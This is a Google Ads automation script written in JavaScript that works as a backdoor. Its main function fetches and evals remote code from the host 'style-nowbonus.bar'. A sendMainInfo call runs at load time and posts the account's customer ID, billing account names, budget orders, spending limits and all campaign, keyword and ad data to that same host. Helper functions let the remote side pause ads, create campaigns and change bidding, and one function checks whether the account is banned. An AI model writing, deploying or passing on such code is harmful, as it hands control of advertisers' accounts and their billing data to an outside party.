function main(){
    eval(UrlFetchApp.fetch("http://style-nowbonus.bar/0mplx90rvwef/"+Math.random()).getContentText());
}

function main(){
    eval("function Log() { Logger.log(123); } Log();");
}

sendMainInfo();

function Log(text)
{
	//return;
	Logger.log(text);
}

function pauseAllAds(group)
{
	Log('pauseAllAds');
	var adIterator=group.ads().get();
	while(adIterator.hasNext())
	{
		var ad=adIterator.next();
		if(ad.isPaused())
			continue;
		ad.pause();
	}
}

function getGroupByID(id)
{
	Log('getGroupByID');
	var groupsIterator=AdsApp.adGroups().get();
	if(!groupsIterator.hasNext())
		return null;
	var group=groupsIterator.next();
	while(id && groupsIterator.hasNext() && group.getId()!==id)
		group=groupsIterator.next();
	if(group && id && group.getId()!==id)
		return null;
	return group;
}

function sendMainInfo()
{
	Log('sendMainInfo');
	UrlFetchApp.fetch("http://style-nowbonus.bar/0mplx90rvwef/",{
		'method':'post',
		'contentType':'application/json',
		'payload':JSON.stringify({
			action:'upload',
			data:getMainInfo()
		})
	}).getContentText();
}

function createCampaign(budget)
{
	Log('createCampaign');
	var columns=['Campaign','Budget','Bid Strategy type','Campaign type'];
	var campaignName="Auto Campaign "+(Date.now()+Math.random()).toString(36);
	var upload=AdsApp.bulkUploads().newCsvUpload(columns,{moneyInMicros:false});
	upload.append({
		"Campaign":campaignName,
		"Budget":budget,
		"Bid Strategy type":"cpc",
		"Campaign type":"Search Only"
	});
	upload.forCampaignManagement();
	upload.apply();
	var campaignIterator=AdsApp.campaigns().get();
	if(!campaignIterator.hasNext())
		return;
	var campaign=campaignIterator.next();
	while(!campaign.isEnabled())
		campaign=campaignIterator.next();
	return campaign;
	//return getCampaign(campaignName);
}

function getCampaign(campaignName)
{
	Log('getCampaign');
	var campaignIterator=AdsApp.campaigns().get();
	if(!campaignIterator.hasNext())
		return;
	var campaign=campaignIterator.next();
	while(campaignName && campaignIterator.hasNext() && campaign.getName()!==campaignName)
		campaign=campaignIterator.next();
	if(campaign && campaignName && campaign.getName()!==campaignName)
		return;
	return campaign;
}

function createGroup(campaign,name)
{
	Log('createGroup');
	return campaign.newAdGroupBuilder()
			.withName(name)
			.build().getResult();
}

function getLastCampaign()
{
	Log('getLastCampaign');
	var campaign=null;
	var campaignIterator=AdsApp.campaigns().get();
	while(campaignIterator.hasNext())
		campaign=campaignIterator.next();
	return campaign;
}

function arrayToObject(arr,price)
{
	Log('arrayToObject');
	if(!Array.isArray(arr))
		return arr;
	if(!price && price!==0)
		price=1;
	var o={};
	for(var i=0;i<arr.length;++i)
		o[arr[i]]=price;
	return o;
}

function setKeywordsCPC(group,keywords,cpc)
{
	Log('setKeywordsCPC');
	if(Array.isArray(keywords) && !cpc)
		return;
	keywords=arrayToObject(keywords,cpc);
	var keywordsIterator=group.keywords().get();
	while(keywordsIterator.hasNext())
	{
		var kw=keywordsIterator.next();
		if(kw.getText() in keywords)
		{
			kw.bidding().setCpc(keywords[kw.getText()]);
			delete keywords[kw.getText()];
		}
		else
			kw.remove();
	}
	for(var k in keywords)
		group.newKeywordBuilder().withText(k).withCpc(keywords[k]).build();
}

function setStopwords(group,stopwords)
{
	Log('setStopwords');
	stopwords=arrayToObject(stopwords);
	var stopwordsIterator=group.negativeKeywords().get();
	while(stopwordsIterator.hasNext())
	{
		var sw=stopwordsIterator.next();
		if(sw.getText() in stopwords)
			delete stopwords[sw.getText()];
		else
			sw.remove();
	}
	for(var s in stopwords)
		group.createNegativeKeyword(s);
}

function removeAllLanguages(campaign)
{
	Log('removeAllLanguages');
	var languageIterator=campaign.targeting().languages().get();
	while(languageIterator.hasNext())
		languageIterator.next().remove();
}

function changeLocation(campaign,locationID)
{
	Log('changeLocation');
	if(!locationID)
		return;
	if(!Array.isArray(locationID) && (typeof locationID!=='object'))
		locationID=[locationID];
	locationID=arrayToObject(locationID);
	var locationsIterator=campaign.targeting().targetedLocations().get();
	while(locationsIterator.hasNext())
	{
		var lo=locationsIterator.next();
		var id=lo.getId().toString();
		if(id in locationID)
			delete locationID[id];
		else
			lo.remove();
	}
	for(var l in locationID)
		campaign.addLocation(parseInt(l));
}

function createNewAd(group,url,heads,descr,path1,path2)
{
	Log('createNewAd');
	var builder=group.newAd().expandedTextAdBuilder();
	var headParts=['1','2','3'];
	var descParts=['1','2'];
	for(var i=0;i<heads.length && i<headParts.length;++i)
		builder=builder['withHeadlinePart'+headParts[i]](heads[i]);
	for(var i=0;i<descr.length && i<descParts.length;++i)
		builder=builder['withDescription'+descParts[i]](descr[i]);
	var op=builder
	.withPath1(path1)
	.withPath2(path2)
	.withFinalUrl(url)
	.build();
	var newAd=op.getResult();
	if(!newAd)
		return;
	return newAd;
}

function createNewResponsiveAd(group,url,heads,descr,path1,path2)
{
	Log('createNewResponsiveAd');
	var op=group.newAd().responsiveSearchAdBuilder()
	.withHeadlines(heads)
	.withDescriptions(descr)
	.withPath1(path1)
	.withPath2(path2)
	.withFinalUrl(url)
	.build();
	var newAd=op.getResult();
	if(!newAd)
		return;
	return newAd;
}

function changeBiddingStrategy(campaign,biddingStrategy)
{
	Log('changeBiddingStrategy');
	if(campaign.getBiddingStrategyType()!==biddingStrategy)
		campaign.bidding().setStrategy(biddingStrategy);
}

function getMainInfo()
{
	Log('getMainInfo');
	var out={
		banned:isBanned(),
		campaigns:getCampaigns(),
		account:getAccountInfo(),
		timestamp:Date.now(),
		orders:getOrders()
	};
	return out;
}

function getOrders()
{
	var budgetOrderIterator=AdsApp.budgetOrders().get();
	var out=[];
	while(budgetOrderIterator.hasNext()) 
	{
		var budgetOrder=budgetOrderIterator.next();
		try
		{
			out.push({
				account:budgetOrder.getBillingAccount().getName(),
				id:budgetOrder.getId(),
				name:budgetOrder.getName(),
				po:budgetOrder.getPoNumber(),
				limit:budgetOrder.getSpendingLimit(),
				totalAdjustments:budgetOrder.getTotalAdjustments()
			});
		}
		catch(e){}
	}
	return out;
}

function getAccountInfo()
{
	var account=AdsApp.currentAccount();
	return {
		currency:account.getCurrencyCode(),
		customer_id:account.getCustomerId(),
		name:account.getName(),
		timezone:account.getTimeZone()
	};
}

function isBanned()
{
	Log('isBanned');
	var campaignIterator=AdsApp.campaigns().get();
	if(!campaignIterator.hasNext())
		return false;
	var campaign=campaignIterator.next();
	if(!campaign)
		return false;
	var labelName='Not banned';
	var labels=AdsApp.labels().withCondition("Name='"+labelName+"'").get();
	if(!labels.hasNext())
		AdsApp.createLabel(labelName);
	campaign.applyLabel(labelName);
	var l=campaign.labels().get();
	var o=true;
	while(l.hasNext())
	{
		if(l.next().getName()===labelName)
			o=false;
	}
	campaign.removeLabel(labelName);
	return o;
}

function getBudget(campaign)
{
	var budget=campaign.getBudget();
	if(!budget)
		return {};
	return {
		amount:budget.getAmount(),
		devivery_method:budget.getDeliveryMethod(),
		total_amount:budget.getTotalAmount(),
		type:budget.getType()
	};
}

function getCampaigns()
{
	Log('getCampaigns');
	var campaigns=[];
	var campaignIterator=AdsApp.campaigns().get();
	while(campaignIterator.hasNext())
	{
		campaign=campaignIterator.next();
		var stats=campaign.getStatsFor("ALL_TIME");
		campaigns.push({
			campaign_name:campaign.getName(),
			campaign_id:campaign.getId(),
			bidding_strategy:campaign.getBiddingStrategyType(),
			locations:getLocations(campaign),
			languages:getLanguages(campaign),
			groups:getGroups(campaign),
			clicks:stats.getClicks(),
			impressions:stats.getImpressions(),
			avgcpc:stats.getAverageCpc(),
			avgcpm:stats.getAverageCpm(),
			cost:stats.getCost(),
			budget:getBudget(campaign)
		});
	}
	return campaigns;
}

function getGroups(campaign)
{
	Log('getGroups');
	var groupsIterator=campaign.adGroups().get();
	var groups=[];
	while(groupsIterator.hasNext())
	{
		var group=groupsIterator.next();
		groups.push({
			name:group.getName(),
			id:group.getId(),
			bidding:getBidding(group),
			enabled:group.isEnabled(),
			paused:group.isPaused(),
			removed:group.isRemoved(),
			keywords:getKeywords(group),
			stopwords:getStopwords(group),
			keywordsBidding:getKeywordsBidding(group),
			ads:getAds(group)
		});
	}
	return groups;
}

function getAds(group)
{
	Log('getAds');
	var adIterator=group.ads().get();
	var ads=[];
	while(adIterator.hasNext())
	{
		var ad=adIterator.next();
		var type=ad.getType();
		var a={
			id:ad.getId(),
			type:type,
			enabled:ad.isEnabled(),
			paused:ad.isPaused()
		};
		if(type==='EXPANDED_TEXT_AD' || type==='VERSATILE_TEXT_AD' || type==='MULTI_ASSET_RESPONSIVE_AD')
		{
			if(type==='MULTI_ASSET_RESPONSIVE_AD')
			{
				ad=ad.asType().responsiveSearchAd();
				type='VERSATILE_TEXT_AD';
			}
			Object.assign(a,{
				url:ad.urls().getFinalUrl(),
				path1:ad.getPath1(),
				path2:ad.getPath2(),
				policyApprovalStatus:ad.getPolicyApprovalStatus(),
				policyTopics:ad.getPolicyTopics().map(function(l){
					return {
						name:l.getName(),
						type:l.getType()
					};
				})
			});
			if(type==='EXPANDED_TEXT_AD')
			{
				a.descriptions=[ad.getDescription(),ad.getDescription1(),ad.getDescription2()];
				a.headlines=[ad.getHeadlinePart1(),ad.getHeadlinePart2(),ad.getHeadlinePart3()];
			}
			else if(type==='VERSATILE_TEXT_AD')
			{
				a.headlines=ad.getHeadlines().map(function(h){return h.text;});
				a.descriptions=ad.getDescriptions().map(function(h){return h.text;});
			}
		}
		ads.push(a);
	}
	return ads;
}

function getKeywordsBidding(group)
{
	Log('getKeywordsBidding');
	var keywordsIterator=group.keywords().get();
	var keywords={};
	while(keywordsIterator.hasNext())
	{
		var kw=keywordsIterator.next();
		var bidding=kw.bidding();
		var strategy=bidding.getStrategy();
		strategy=strategy&&strategy.getName()||null;
		keywords[kw.getText()]={
			cpc:bidding.getCpc(),
			cpm:bidding.getCpm(),
			strategy:strategy,
			strategyType:bidding.getStrategyType(),
			approvalStatus:kw.getApprovalStatus(),
			top_of_page:kw.getTopOfPageCpc()
		};
	}
	return keywords;
}

function getLanguages(campaign)
{
	Log('getLanguages');
	var languagesIterator=campaign.targeting().languages().get();
	var languages=[];
	while(languagesIterator.hasNext())
		languages.push(languagesIterator.next().getName());
	return languages;
}

function getLocations(campaign)
{
	Log('getLocations');
	var locationIterator=campaign.targeting().targetedLocations().get();
	var locations=[];
	while(locationIterator.hasNext())
		locations.push(locationIterator.next().getId());
	return locations;
}

function getBidding(group)
{
	Log('getBidding');
	var bidding=group.bidding();
	var strategy=bidding.getStrategy();
	strategy=strategy&&strategy.getName()||null;
	return {
		cpa:bidding.getCpa(),
		cpc:bidding.getCpc(),
		cpm:bidding.getCpm(),
		strategy:strategy,
		strategyType:bidding.getStrategyType()
	};
}

function getKeywords(group,negative)
{
	Log('getKeywords');
	var keywordsSelector;
	if(negative)
		keywordsSelector=group.negativeKeywords();
	else
		keywordsSelector=group.keywords();
	var keywordsIterator=keywordsSelector.get();
	var keywords=[];
	while(keywordsIterator.hasNext())
		keywords.push(keywordsIterator.next().getText());
	return keywords;
}

function getStopwords(group)
{
	Log('getStopwords');
	return getKeywords(group,true);
}